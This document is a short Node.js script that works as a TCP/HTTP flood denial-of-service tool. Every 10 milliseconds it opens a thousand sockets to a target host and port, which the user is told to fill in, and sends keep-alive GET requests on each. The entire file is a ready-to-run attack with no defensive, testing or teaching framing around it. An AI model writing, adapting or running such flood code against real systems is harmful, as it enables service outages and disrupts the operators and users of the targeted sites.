const net = require('net');

const target = 'example.com'; // Replace with target domain or IP
const port = 80; // Replace with target port
const connections = 1000; // Number of simultaneous connections

function floodTCP() {
    for (let i = 0; i < connections; i++) {
        const socket = new net.Socket();
        socket.connect(port, target, () => {
            console.log(`[Connection ${i}] TCP flood to ${target}:${port}`);
            socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\nConnection: keep-alive\r\n\r\n');
        });

        socket.on('data', (data) => {
            console.log(`[Connection ${i}] Received data: ${data}`);
        });

        socket.on('error', (err) => {
            console.error(`[Connection ${i}] Error: ${err.message}`);
        });

        socket.on('close', () => {
            console.log(`[Connection ${i}] Connection closed.`);
        });
    }
}

// Flood the target every 10ms
setInterval(floodTCP, 10);